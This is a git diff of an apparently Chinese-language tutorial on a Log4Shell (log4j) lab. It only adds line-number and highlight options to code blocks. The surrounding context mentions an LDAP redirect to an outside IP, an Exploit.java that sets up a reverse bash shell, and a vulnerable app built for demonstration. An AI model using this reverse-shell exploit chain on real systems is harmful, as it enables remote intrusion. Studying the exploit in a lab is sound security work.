@@ -45,7 +45,7 @@ Send LDAP reference result for Exploit redirecting to http://35.221.253.187:8080
 
 主要有兩個檔案 `DetailedHttpServer.java` 和 `Exploit.java`，分別是用來建立一個簡單的 http server 和設定 reverse bash (惡意檔案)。
 
-```java title="DetailedHttpServer.java"
+```java title="DetailedHttpServer.java" showLineNumbers
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
@@ -96,7 +96,7 @@ public class DetailedHttpServer {
 }
 ```
 
-```java title="Exploit.java"
+```java title="Exploit.java" showLineNumbers {6-7}
 import java.io.IOException;
 
 public class Exploit {
@@ -192,7 +192,7 @@ bash-4.4#
 在受害者的電腦中，首先需要建立一個 java 的 http server 來接收使用者打的 api，
 接著使用 docker 來構建一個含有漏洞的 log4j 環境。
 
-```java title="VulnerableApp.java"
+```java title="VulnerableApp.java" showLineNumbers {64-67}
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import com.sun.net.httpserver.HttpExchange;
